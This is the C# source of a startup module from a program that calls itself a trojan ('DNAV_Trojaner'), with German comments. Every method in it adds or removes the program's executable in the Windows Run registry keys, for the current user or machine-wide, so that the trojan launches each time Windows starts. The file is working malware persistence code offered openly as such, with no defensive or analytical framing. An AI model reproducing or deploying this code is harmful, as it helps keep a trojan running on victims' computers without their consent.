using Microsoft.Win32;
using System.Windows.Forms;

namespace DNAV_Trojaner
{
    class Startup
    {
        /// <summary>
        /// Startet den Trojaner beim Start von Windows.
        /// </summary>
        public static void Enable()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DNAV", Application.ExecutablePath.ToString());
            key.Close();
        }

        /// <summary>
        /// Deaktiviert den Autostart des Trojaners.
        /// </summary>
        public static void Disable()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.DeleteValue("DNAV", false);
        }

        /// <summary>
        /// Startet den Trojaner beim Start von Windows. Wird benötigt, wenn der Trojaner nur mit Administratorrechten ausgeführt werden kann.
        /// </summary>
        public static void EnableForAdmin()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DNAV", Application.ExecutablePath.ToString());
            key.Close();
        }

        /// <summary>
        /// Deaktiviert den Autostart des Trojaners mit Administratorrechten.
        /// </summary>
        public static void DisableForAdmin()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.DeleteValue("DNAV", false);
        }
    }
}
